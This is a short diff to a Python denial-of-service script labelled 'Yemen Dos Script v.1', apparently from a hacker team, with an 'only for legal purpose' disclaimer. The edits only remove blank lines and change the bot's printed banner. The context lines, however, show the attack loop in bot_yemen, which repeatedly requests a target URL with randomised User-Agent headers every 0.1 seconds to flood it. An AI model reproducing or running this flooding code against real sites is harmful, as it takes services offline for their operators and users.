@@ -4,8 +4,6 @@
 # python 3.3.2+  Yemen Dos Script v.1
 # by Akram Mohamed =====> team elradaa electronic
 # only for legal purpose
-
-
 from queue import Queue
 from optparse import OptionParser
 import os
@@ -36,7 +34,7 @@ def bot_yemen(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[1;33mbot YEMEN_Elradaa...^\033[0m")
+			print("\033[1;33mbot YEMEN_BX1...^\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
